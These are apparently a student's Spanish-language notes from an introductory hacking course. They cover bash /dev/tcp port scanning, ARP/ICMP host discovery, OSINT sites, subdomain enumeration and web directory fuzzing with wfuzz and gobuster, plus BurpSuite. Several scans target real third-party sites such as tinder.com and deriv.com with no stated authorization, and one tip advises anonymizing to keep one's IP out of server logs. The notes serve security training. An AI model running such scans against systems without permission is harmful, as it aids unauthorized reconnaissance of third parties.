[Anterior](https://hack4u.io/cursos/introduccion-al-hacking/14721)
```
❯ nvim portScan.sh
❯ chmod +x portScan.sh
❯ ./portScan.sh
```

![[Pasted image 20240717194438.png]]
```
❯ ./portScan.sh
^C

[!] Saliendo...
```


![[Pasted image 20240717195756.png]]
```
./portScan.sh 
```
![[Pasted image 20240717195908.png]]

```
❯ bash
┌─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #echo '' > /dev/tcp/192.168.1.1/22
┌─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #echo $?
0
┌─[✗]─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #(echo '' > /dev/tcp/192.168.1.1/29) 2>/dev/null
┌─[✗]─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #echo $?
1

-----------------------------
Con descriptores de archivos
-----------------------------
┌─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #exec 3<> /dev/tcp/192.168.1.1/443
┌─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #echo $?
0
┌─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #exec 3<> /dev/tcp/192.168.1.1/449
bash: connect: Conexión rehusada
bash: /dev/tcp/192.168.1.1/449: Conexión rehusada
┌─[✗]─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #exec 3>&-
┌─[root@parrot]─[/home/k4rma/Desktop/k4rma/Academia]
└──╼ #exec 3<&-
```

![[Pasted image 20240717222614.png]]

```
❯ nvim portScan.sh
❯ ./portScan.sh

[!] Uso: ./portScan.sh <ip-address>

❯ ./portScan.sh 192.168.1.1
[+] Host 192.168.1.1 - Port 443 (OPEN)
[+] Host 192.168.1.1 - Port 80 (OPEN)
[+] Host 192.168.1.1 - Port 22 (OPEN)
^C

[!] Saliendo...
```


*--------------------------------------------------------------------------*
**# Descubrimiento de equipos en la red local (ARP e ICMP) y Tips**
*--------------------------------------------------------------------------*
El descubrimiento de equipos en la red local es una tarea fundamental en la gestión de redes y en las pruebas de seguridad. Existen diferentes herramientas y técnicas para realizar esta tarea, que van desde el escaneo de puertos hasta el análisis de tráfico de red.

En esta clase, nos enfocaremos en las técnicas de descubrimiento de equipos basadas en los protocolos **ARP** e **ICMP**. Además, se presentarán diferentes herramientas que pueden ser útiles para esta tarea, como **Nmap**, **netdiscover**, **arp-scan** y **masscan**.

Entre los modos de escaneo que se explican en la clase, se encuentra el uso del parámetro ‘**-sn**‘ de Nmap, que permite realizar un escaneo de hosts sin realizar el escaneo de puertos. También se presentan las herramientas netdiscover, arp-scan y masscan, que utilizan el protocolo ARP para descubrir hosts en la red.

Cada herramienta tiene sus propias ventajas y limitaciones. Por ejemplo, **netdiscover** es una herramienta simple y fácil de usar, pero puede ser menos precisa que **arp-scan** o **masscan**. Por otro lado, **arp-scan** y **masscan** son herramientas más potentes, capaces de descubrir hosts más rápido y en redes más grandes, pero también son más complejas y pueden requerir más recursos.

En definitiva, el descubrimiento de equipos en la red local es una tarea fundamental para cualquier administrador de redes o profesional de seguridad de la información. Con las técnicas y herramientas adecuadas, es posible realizar esta tarea de manera efectiva y eficiente.

*arp-scan*
```
❯ hostname -I
192.168.1.40 
❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.40  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::6edc:46f3:33a2:a562  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:6f:4d:83  txqueuelen 1000  (Ethernet)
        RX packets 37313  bytes 2428615 (2.3 MiB)
        RX errors 0  dropped 669  overruns 0  frame 0
        TX packets 32747  bytes 2490610 (2.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:6f:4d:83, IPv4: 192.168.1.40
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	78:29:ed:2c:86:d8	ASKEY COMPUTER CORP
192.168.1.60	28:ee:52:05:f8:f6	TP-LINK TECHNOLOGIES CO.,LTD.

318 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.115 seconds (121.04 hosts/sec). 2 responded

❯ arp-scan --help | grep dup
--ignoredups or -g	Don't display duplicate packets.
			By default duplicate packets are flagged with
			DUP	Packet number for duplicate packets (>1)
			
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:6f:4d:83, IPv4: 192.168.1.40
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	78:29:ed:2c:86:d8	ASKEY COMPUTER CORP
192.168.1.60	28:ee:52:05:f8:f6	TP-LINK TECHNOLOGIES CO.,LTD.

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.061 seconds (124.21 hosts/sec). 2 responded
```

*net-discover*-> s4vitar no la recomienda mucho
```
❯ netdiscover -i ens33
```
![[Pasted image 20240717225312.png]]

*TIP*-> Es común que aunque tenga la empresa a auditar una mascara de red tipo C, ip: 192.168.1.1/24 -> 255.255.255.0. A veces haciendo busqueda desde 192.168.0.0/16 encuentres equipos. El cliente cuando dice que hay segmentación se equivoca ya que el subnetting no toma el rango como aislado, por lo que puede haber ip que estén fuera de rango.

*Manual*
```
❯ timeout 1 bash -c "ping -c 1 192.168.1.1" &>/dev/null
❯ echo $?
0
❯ timeout 1 bash -c "ping -c 1 192.168.1.2" &>/dev/null
❯ echo $?
124
```

Montaremos un script, en vez de con ping (que a veces nos dará problemas con algunos firewalls, haremos echo de caracter vacio):
```
nvim hostDiscovery.sh
```
![[Pasted image 20240718173157.png]]

```
❯ ./hostDiscovery.sh
[+] Host 192.168.1.1 - Port 22 (OPEN)
[+] Host 192.168.1.1 - Port 443 (OPEN)
[+] Host 192.168.1.1 - Port 80 (OPEN)
[+] Host 192.168.1.60 - Port 80 (OPEN)
[+] Host 192.168.1.60 - Port 443 (OPEN)
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:6f:4d:83, IPv4: 192.168.1.40
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	78:29:ed:2c:86:d8	ASKEY COMPUTER CORP
192.168.1.36	78:5d:c8:cb:57:9f	LG Electronics
192.168.1.60	28:ee:52:05:f8:f6	TP-LINK TECHNOLOGIES CO.,LTD.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 3 responded
```

*masscan* ->Muchas veces en entorno empresarial está expuesto el SMD (más de un 80% de empresas) -> 445 son típico de redes empresariales 
Aunque sea de clase C rastrearemos como si fuese 192.168.0.0/16 y con un máximo de 5000 paquetes:
```
❯ masscan -p21,22,139,445,8080,80,443 -Pn 192.168.0.0/16 --rate=5000

Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-07-18 15:36:43 GMT
Initiating SYN Stealth Scan
Scanning 65536 hosts [7 ports/host]
Discovered open port 443/tcp on 192.168.1.1                                    
Discovered open port 443/tcp on 192.168.1.60                                   
Discovered open port 80/tcp on 192.168.1.1                                     
Discovered open port 22/tcp on 192.168.1.1                                     
Discovered open port 80/tcp on 192.168.1.60 
```

*----------------------*
 *Boug bounty webs*
*----------------------*
- https://hackerone.com/
- https://www.yeswehack.com/
- https://www.bugcrowd.com/
- https://www.intigriti.com/


*-----------------------------*
*OSINT* / *Shoulder surfing*
*-----------------------------*
Descubrimiento de correos electrónicos:
- https://hunter.io/
- https://intelx.io/
- https://phonebook.cz/
- https://www.verifyemailaddress.org/
- https://email-checker.net/

Verificación de emails existentes:
- https://www.verifyemailaddress.org/
- https://email-checker.net/

Reconocimiento de cara:
- https://pimeyes.com/es

Password de cuentas:
- https://www.dehashed.com/

*--------------------------------*
*Enumeración de Subdominios*
*--------------------------------*
La enumeración de **subdominios** es una de las fases cruciales en la seguridad informática para identificar los subdominios asociados a un dominio principal.

Los subdominios son parte de un dominio más grande y a menudo están configurados para apuntar a diferentes recursos de la red, como servidores web, servidores de correo electrónico, sistemas de bases de datos, sistemas de gestión de contenido, entre otros.

Al identificar los subdominios vinculados a un dominio principal, un atacante podría obtener información valiosa para cada uno de estos, lo que le podría llevar a encontrar **vectores de ataque potenciales**. Por ejemplo, si se identifica un subdominio que apunta a un servidor web vulnerable, el atacante podría utilizar esta información para intentar explotar la vulnerabilidad y acceder al servidor en cuestión.

Existen diferentes herramientas y técnicas para la enumeración de subdominios, tanto pasivas como activas. Las **herramientas** **pasivas** permiten obtener información sobre los subdominios sin enviar ninguna solicitud a los servidores identificados, mientras que las **herramientas activas** envían solicitudes a los servidores identificados para encontrar subdominios bajo el dominio principal.

Algunas de las **herramientas pasivas** más utilizadas para la enumeración de subdominios incluyen la búsqueda en motores de búsqueda como Google, Bing o Yahoo, y la búsqueda en registros DNS públicos como **PassiveTotal** o **Censys**. Estas herramientas permiten identificar subdominios asociados con un dominio, aunque no siempre son exhaustivas. Además, existen herramientas como **CTFR** que utilizan registros de certificados **SSL/TLS** para encontrar subdominios asociados a un dominio.

También se pueden utilizar páginas online como **Phonebook.cz** e **Intelx.io**, o herramientas como **sublist3r**, para buscar información relacionada con los dominios, incluyendo subdominios.

Por otro lado, las **herramientas activas** para la enumeración de subdominios incluyen herramientas de fuzzing como **wfuzz** o **gobuster**. Estas herramientas envían solicitudes a los servidores mediante ataques de fuerza bruta, con el objetivo de encontrar subdominios válidos bajo el dominio principal.

*PASIVA*
- https://phonebook.cz/ 
![[Pasted image 20240718214051.png|500]]


- https://github.com/UnaPibaGeek/ctfr ->
```
❯ git clone https://github.com/UnaPibaGeek/ctfr
❯ cd ctfr
❯ pip3 install -r requirements.txt
❯ python3 ctfr.py -d tinder.com

          ____ _____ _____ ____  
         / ___|_   _|  ___|  _ \ 
        | |     | | | |_  | |_) |
        | |___  | | |  _| |  _ < 
         \____| |_| |_|   |_| \_\
	
     Version 1.2 - Hey don't miss AXFR!
    Made by Sheila A. Berta (UnaPibaGeek)
	

[!] ---- TARGET: tinder.com ---- [!] 

[-]  *.swipelife.tinder.com
swipelife.tinder.com
[-]  emoji.tinder.com
[-]  go.tinder.com
[-]  help.tinder.com
[-]  help.tinder.com
www.help.tinder.com
[-]  invite.tinder.com
[-]  link.mail.tinder.com
link.tinder.com
link.updates.tinder.com
[-]  lite.tinder.com
[-]  matchmaker.tinder.com
[-]  open.tinder.com
[-]  party.tinder.com
[-]  policies.tinder.com
[-]  polls.tinder.com
[-]  staging.tinder.com
[-]  swipelife.tinder.com
[-]  swipenight.tinder.com
[-]  swipenight.tinder.com
www.swipenight.tinder.com
[-]  tech.gotinder.com
tech.tinder.com
[-]  testrail.tinder.com
[-]  tinder.com
web.tinder.com
www.tinder.com
[-]  tinder.com
www.tinder.com
[-]  www.help.tinder.com
```


- https://github.com/aboul3la/Sublist3r
```
❯ git clone https://github.com/aboul3la/Sublist3r
❯ cd Sublist3r
❯ python3 setup.py install
❯ pip3 install -r requirements.txt
❯ python3 sublist3r.py -d tinder.com

                 ____        _     _ _     _   _____
                / ___| _   _| |__ | (_)___| |_|___ / _ __
                \___ \| | | | '_ \| | / __| __| |_ \| '__|
                 ___) | |_| | |_) | | \__ \ |_ ___) | |
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|

                # Coded By Ahmed Aboul-Ela - @aboul3la
    
[-] Enumerating subdomains now for tinder.com
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Google..
[-] Searching now in Bing..
[-] Searching now in Ask..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
[-] Searching now in Virustotal..
[-] Searching now in ThreatCrowd..
[-] Searching now in SSL Certificates..
[-] Searching now in PassiveDNS..
[!] Error: Virustotal probably now is blocking our requests
[-] Total Unique Subdomains Found: 23
tech.gotinder.com
www.tinder.com
emoji.tinder.com
go.tinder.com
help.tinder.com
www.help.tinder.com
invite.tinder.com
link.tinder.com
lite.tinder.com
link.mail.tinder.com
matchmaker.tinder.com
open.tinder.com
party.tinder.com
policies.tinder.com
polls.tinder.com
staging.tinder.com
swipelife.tinder.com
swipenight.tinder.com
www.swipenight.tinder.com
tech.tinder.com
testrail.tinder.com
link.updates.tinder.com
web.tinder.com
```



*ACTIVA

*gobuster* -> está programado en go, optimizado para socket y conexiones.
```
❯ gobuster vhost -h
Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)

Usage:
  gobuster vhost [flags]

Flags:
      --append-domain                     Append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist.
      --client-cert-p12 string            a p12 file to use for options TLS client certificates
      --client-cert-p12-password string   the password to the p12 file
      --client-cert-pem string            public key in PEM format for optional TLS client certificates
      --client-cert-pem-key string        private key in PEM format for optional TLS client certificates (this key needs to have no password)
  -c, --cookies string                    Cookies to use for the requests
      --domain string                     the domain to append when using an IP address as URL. If left empty and you specify a domain based URL the hostname from the URL is extracted
      --exclude-length string             exclude the following content lengths (completely ignores the status). You can separate multiple lengths by comma and it also supports ranges like 203-206
  -r, --follow-redirect                   Follow redirects
  -H, --headers stringArray               Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                              help for vhost
  -m, --method string                     Use the following HTTP method (default "GET")
      --no-canonicalize-headers           Do not canonicalize HTTP header names. If set header names are sent as is.
  -k, --no-tls-validation                 Skip TLS certificate verification
  -P, --password string                   Password for Basic Auth
      --proxy string                      Proxy to use for requests [http(s)://host:port] or [socks5://host:port]
      --random-agent                      Use a random User-Agent string
      --retry                             Should retry on request timeout
      --retry-attempts int                Times to retry on request timeout (default 3)
      --timeout duration                  HTTP Timeout (default 10s)
  -u, --url string                        The target URL
  -a, --useragent string                  Set the User-Agent string (default "gobuster/3.6")
  -U, --username string                   Username for Basic Auth

Global Flags:
      --debug                 Enable debug output
      --delay duration        Time each thread waits between requests (e.g. 1500ms)
      --no-color              Disable color output
      --no-error              Don't display errors
  -z, --no-progress           Don't display progress
  -o, --output string         Output file to write results to (defaults to stdout)
  -p, --pattern string        File containing replacement patterns
  -q, --quiet                 Don't print the banner and other noise
  -t, --threads int           Number of concurrent threads (default 10)
  -v, --verbose               Verbose output (errors)
  -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.
      --wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)

```


Nos descargaremos el diccionario Seclists -> https://github.com/danielmiessler/SecLists

```
apt -y install seclists
```

```
❯ gobuster vhost -u https://tinder.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t20 | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://tinder.com
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: www.shop Status: 421 [Size: 1003]
Found: www.admin Status: 421 [Size: 1003]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```


*wfuzz* -> hc=hide code /sh=show code -H=header - FUZZ=payload del diccionario. Para muchos hackers es mejor que gobuster.
```
❯ wfuzz -c --hc=403 -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.tinder.com" http://tinder.com
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://tinder.com/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   301        7 L      11 W       167 Ch      "www"                                                                                                                  
000000067:   301        7 L      11 W       167 Ch      "staging"                                                                                                              
000000401:   301        7 L      11 W       167 Ch      "tech"                                                                                                                 
000001681:   301        7 L      11 W       167 Ch      "lite"                                                                                                                 

Total time: 0
Processed Requests: 4989
Filtered Requests: 4985
Requests/sec.: 0
```


*feroxbuster*

https://github.com/epi052/feroxbuster

```

```



*----------------------------*
*Identificación de tec. web*
*----------------------------*
Desde el punto de vista de la seguridad, es fundamental conocer las **tecnologías** y **herramientas** que se utilizan en una página web. La identificación de estas tecnologías permite a los expertos en seguridad evaluar los riesgos potenciales de un sitio web, identificar vulnerabilidades y diseñar estrategias efectivas para proteger la información sensible y los datos críticos.

Existen diversas herramientas y utilidades en línea que permiten identificar las tecnologías utilizadas en una página web. Algunas de las herramientas más populares incluyen **Whatweb**, **Wappalyzer** y **builtwith.com**. Estas herramientas escanean la página web y proporcionan información detallada sobre las tecnologías utilizadas, como el lenguaje de programación, el servidor web, los sistemas de gestión de contenido, entre otros.

La herramienta **whatweb** es una utilidad de análisis de vulnerabilidades que escanea la página web y proporciona información detallada sobre las tecnologías utilizadas. Esta herramienta también puede utilizarse para identificar posibles vulnerabilidades y puntos débiles en la página web.

**Wappalyzer**, por otro lado, es una extensión del navegador que detecta y muestra las tecnologías utilizadas en la página web. Esta herramienta es especialmente útil para los expertos en seguridad que desean identificar rápidamente las tecnologías utilizadas en una página web sin tener que realizar un escaneo completo.

**Builtwith.com** es una herramienta en línea que también permite identificar las tecnologías utilizadas en una página web. Esta herramienta proporciona información detallada sobre las tecnologías utilizadas, así como también estadísticas útiles como el tráfico y la popularidad de la página web.

A continuación, os proporcionamos los enlaces correspondientes a las herramientas vistas en esta clase:

- **Whatweb**: [https://github.com/urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)
- **Wappalyzer**: [https://addons.mozilla.org/es/firefox/addon/wappalyzer/](https://addons.mozilla.org/es/firefox/addon/wappalyzer/)
- **Builtwith**: [https://builtwith.com/](https://builtwith.com/)

Según el gestor de contenidos se utilizaran unos tipos de escaneres o no.

*Whatweb*

```
❯ whatweb  https://google.com
https://google.com [301 Moved Permanently] Country[UNITED STATES][US], HTTPServer[gws], IP[142.250.200.78], RedirectLocation[https://www.google.com/], Title[301 Moved], UncommonHeaders[content-security-policy-report-only,alt-svc], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[0]
https://www.google.com/ [200 OK] Cookies[AEC,SOCS,__Secure-ENID], Country[UNITED STATES][US], HTML5, HTTPServer[gws], HttpOnly[AEC,__Secure-ENID], IP[142.250.200.68], Script, Title[Google], UncommonHeaders[content-security-policy-report-only,alt-svc], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[0]
```

nos fijaremos en HTTPServer -> gws, investigaremos que es y tiraremos del hilo.

*Wappalyzer*

![[Pasted image 20240720224648.png]]

*buidwith* -> mucha más información que wappalyzer y whatweb:
![[Pasted image 20240720225339.png]]



*----------------------------------------------------------------*
**#Fuzzing y enumeración de archivos en un servidor web**
*----------------------------------------------------------------*
En esta clase, hacemos uso de las herramientas **Wfuzz** y **Gobuster** para aplicar **Fuzzing**. Esta técnica se utiliza para descubrir rutas y recursos ocultos en un servidor web mediante ataques de fuerza bruta. El objetivo es encontrar recursos ocultos que podrían ser utilizados por atacantes malintencionados para obtener acceso no autorizado al servidor.

**Wfuzz** es una herramienta de descubrimiento de contenido y una herramienta de inyección de datos. Básicamente, se utiliza para automatizar los procesos de prueba de vulnerabilidades en aplicaciones web.

Permite realizar ataques de fuerza bruta en parámetros y directorios de una aplicación web para identificar recursos existentes. Una de las **ventajas** de Wfuzz es que es altamente personalizable y se puede ajustar a diferentes necesidades de pruebas. Algunas de las **desventajas** de Wfuzz incluyen la necesidad de comprender la sintaxis de sus comandos y que puede ser más lenta en comparación con otras herramientas de descubrimiento de contenido.

Por otro lado, **Gobuster** es una herramienta de descubrimiento de contenido que también se utiliza para buscar archivos y directorios ocultos en una aplicación web. Al igual que Wfuzz, Gobuster se basa en ataques de fuerza bruta para encontrar archivos y directorios ocultos. Una de las principales **ventajas** de Gobuster es su velocidad, ya que es conocida por ser una de las herramientas de descubrimiento de contenido más rápidas. También es fácil de usar y su sintaxis es simple. Sin embargo, una **desventaja** de Gobuster es que puede no ser tan personalizable como Wfuzz.

En resumen, tanto Wfuzz como Gobuster son herramientas útiles para pruebas de vulnerabilidades en aplicaciones web, pero tienen diferencias en su enfoque y características. La elección de una u otra dependerá de tus necesidades y preferencias personales.

A continuación, te proporcionamos el enlace a estas herramientas:

- **Wfuzz**: [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)
- **Gobuster**: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)


*Gobuster* -> esto deja traza en el log, aparecería tu ip pública -> abría que anonimizarse para que no aparezca la ip pública
``` 
❯ cd /opt
❯ git clone https://github.com/OJ/gobuster
```

![[Pasted image 20240720232507.png]]

Para que el binario no pese tanto:
![[Pasted image 20240720232623.png]]

Utilizando escaneo archivos página web:

Para que no te salga este error en gobuster:
![[Pasted image 20240720233822.png]]

-b 404,403
```
❯ gobuster dir -u https://google.com/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -add-slash -b 403,404,400,302
```

Para ir probando extensiones de tecnología:
![[Pasted image 20240720234546.png]]

En vez de -b (blacklist) ahora haremos alreves que solo me enseñe 200. Para que no casque error-> ``` -b `` ``` -> cadena vacia.
![[Pasted image 20240720235000.png]]


*wfuzz*
```
wfuzz -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://rockstargames.com/FUZZ
```

Para que no te salga este error:
![[Pasted image 20240721000234.png]]

Para matare ese proceso que has dejado en segundo plano:
```
^Z
❯ kill %
[1]  + terminated  gobuster dir -u https://google.com/ -w  -t 200 -add-slash -b  -x p
```

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://rockstargames.com/FUZZ
```
Esto me reporta un porrón de codigo 301, me redirige a otra página. Para que te enseñe a dondo te está redirigiendo -> -L o quitar -L y ..../FUZZ/
```
❯ wfuzz -c -L --hc=404,403 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://deriv.com/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://deriv.com/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        0 L      5153 W     406769 Ch   "# directory-list-2.3-medium.txt"                                                                                      
000000103:   200        100 L    4830 W     355233 Ch   "partners"                                                                                                             
000000003:   200        0 L      5153 W     406769 Ch   "# Copyright 2007 James Fisher"                                                                                        
000000015:   200        0 L      5153 W     406769 Ch   "index"                                                                                                                
000000173:   200        86 L     4560 W     350186 Ch   "careers"                                                                                                              
000000014:   200        0 L      5153 W     406769 Ch   "https://eu.deriv.com/"                                                                                                
000000012:   200        0 L      5153 W     406769 Ch   "# on at least 2 different hosts"                                                                                      
000000010:   200        0 L      5153 W     406769 Ch   "#"                                                                                                                    
000000008:   200        0 L      5153 W     406769 Ch   "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000002:   200        0 L      5153 W     406769 Ch   "#"                                                                                                                    
000000011:   200        0 L      5153 W     406769 Ch   "# Priority ordered case-sensitive list, where entries were found"                                                     
000000009:   200        0 L      5153 W     406769 Ch   "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000006:   200        0 L      5153 W     406769 Ch   "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000005:   200        0 L      5153 W     406769 Ch   "# This work is licensed under the Creative Commons"                                                                   
000000004:   200        0 L      5153 W     406769 Ch   "#"                                                                                                                    
000000007:   200        0 L      5153 W     406769 Ch   "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                      
000000013:   200        0 L      5153 W     406769 Ch   "#"                                                                                                                    
000000217:   200        44 L     3093 W     327857 Ch   "signup"                                                                                                               
000000223:   200        76 L     5388 W     411237 Ch   "de"                                                                                                                   
000000229:   200        79 L     5446 W     411463 Ch   "fr"                                                                                                                   
000000335:   200        76 L     5415 W     411148 Ch   "it"                                                                                                                   
000000393:   200        77 L     5413 W     411203 Ch   "es"                                                                                                                   
000000581:   200        77 L     5329 W     410939 Ch   "tr"                                                                                                                   
000000708:   200        134 L    4300 W     350232 Ch   "contact-us"                                                                                                           
000000455:   200        76 L     5363 W     411121 Ch   "pl"                                                                                                                   
000000727:   200        76 L     5319 W     410896 Ch   "ru"                                                                                                                   
000000814:   200        77 L     5413 W     411206 Ch   "pt"                                                                                                                   
000001287:   200        76 L     5589 W     411182 Ch   "vi"                                                                                                                   
000001128:   200        76 L     5378 W     410750 Ch   "ar"                                                                                                                   
000001559:   200        44 L     2664 W     319819 Ch   "404"                                                                                                                  
000001658:   200        76 L     5422 W     411179 Ch   "sw"                                                                                                                   
000001787:   200        76 L     5411 W     411036 Ch   "si"                                                                                                                   
000001942:   200        50 L     2943 W     323216 Ch   "p2p"                                                                                                                  
000002335:   200        76 L     5132 W     410893 Ch   "th"                                                                                                                   
000002464:   200        76 L     5314 W     409759 Ch   "ko"                                                                                                                   
000002613:   200        104 L    4126 W     345288 Ch   "unsubscribe"                                                                                                          
000003417:   200        76 L     5091 W     409373 Ch   "zh-cn"                                                                                                                
000004508:   200        76 L     5362 W     410878 Ch   "bn"                                                                                                                   
000006106:   200        1199 L   5556 W     123123 Ch   "academy"                                                                                                              
^Z
zsh: suspended  wfuzz -c -L --hc=404,403 -t 200 -w  https://deriv.com/FUZZ
```



veremos cómo se pueden utilizar diferentes parámetros de **Wfuzz** para ajustar el alcance y la profundidad de nuestro reconocimiento en aplicaciones web. Algunos de los parámetros que cubriremos incluyen el parámetro ‘**–sl**‘, para filtrar por un número de líneas determinado, el parámetro ‘**–hl**‘ para ocultar un número de líneas determinado y por último el parámetro ‘**-z**‘ para indicar el tipo de dato que queremos usar de cara al reconocimiento que nos interese aplicar, abarcando opciones como diccionarios, listas y rangos numéricos.

Adicionalmente, otra de las herramientas que examinamos en esta clase, perfecta para la enumeración de recursos disponibles en una plataforma en línea, es **BurpSuite**. BurpSuite es una plataforma que integra características especializadas para realizar pruebas de penetración en aplicaciones web. Una de sus particularidades es la función de **análisis de páginas en línea**, empleada para identificar y enumerar los recursos accesibles en una página web.

BurpSuite cuenta con dos versiones: una **versión gratuita** (**BurpSuite Community Edition**) y una **versión de pago** (**BurpSuite Pofessional**).

### BurpSuite Community Edition

Es la **versión gratuita** de esta plataforma, viene incluida por defecto en el sistema operativo. Su función principal es desempeñar el papel de **proxy HTTP** para la aplicación, facilitando la realización de pruebas de penetración.

Un **proxy HTTP** es un filtro de contenido de alto rendimiento, ampliamente usado en el hacking con el fin de interceptar el tráfico de red. Esto permite analizar, modificar, aceptar o rechazar todas las solicitudes y respuestas de la aplicación que se esté auditando.

Algunas de las ventajas que la versión gratuita ofrecen son:

- **Gratuidad**: La versión Community Edition es gratuita, lo que la convierte en una opción accesible para principiantes y profesionales con presupuestos limitados.
- **Herramientas básicas**: Incluye las herramientas esenciales para realizar pruebas de penetración en aplicaciones web, como el Proxy, el Repeater y el Sequencer.
- **Intercepción y modificación de tráfico**: Permite interceptar y modificar las solicitudes y respuestas HTTP/HTTPS, facilitando la identificación de vulnerabilidades y la exploración de posibles ataques.
- **Facilidad de uso**: La interfaz de usuario de la Community Edition es intuitiva y fácil de utilizar, lo que facilita su adopción por parte de usuarios con diversos niveles de experiencia.
- **Aprendizaje y familiarización**: La versión gratuita permite a los usuarios aprender y familiarizarse con las funcionalidades y técnicas de pruebas de penetración antes de dar el salto a la versión Professional.
- **Comunidad de usuarios**: La versión Community Edition cuenta con una amplia comunidad de usuarios que comparten sus conocimientos y experiencias en foros y blogs, lo que puede ser de gran ayuda para resolver problemas y aprender nuevas técnicas.

A pesar de que la Community Edition no ofrece todas las funcionalidades y ventajas de la versión Professional, sigue siendo una opción valiosa para aquellos que buscan comenzar en el ámbito de las pruebas de penetración o que necesitan realizar análisis de seguridad básicos sin incurrir en costos adicionales.

### BurpSuite Proffesional

BurpSuite Proffessional es la **versión de pago** desarrollada por la empresa **PortSwigger**. Incluye, además del proxy HTTP, algunas herramientas de pentesting web como:

- **Escáner de seguridad automatizado**: Permite identificar vulnerabilidades en aplicaciones web de manera rápida y eficiente, lo que ahorra tiempo y esfuerzo.
- **Integración con otras herramientas**: Puede integrarse con otras soluciones de seguridad y entornos de desarrollo para mejorar la eficacia de las pruebas.
- **Extensibilidad**: A través de su API, BurpSuite Professional permite a los usuarios crear y añadir extensiones personalizadas para adaptarse a necesidades específicas.
- **Actualizaciones frecuentes**: La versión profesional recibe actualizaciones periódicas que incluyen nuevas funcionalidades y mejoras de rendimiento.
- **Soporte técnico**: Los usuarios de BurpSuite Professional tienen acceso a un soporte técnico de calidad para resolver dudas y problemas.
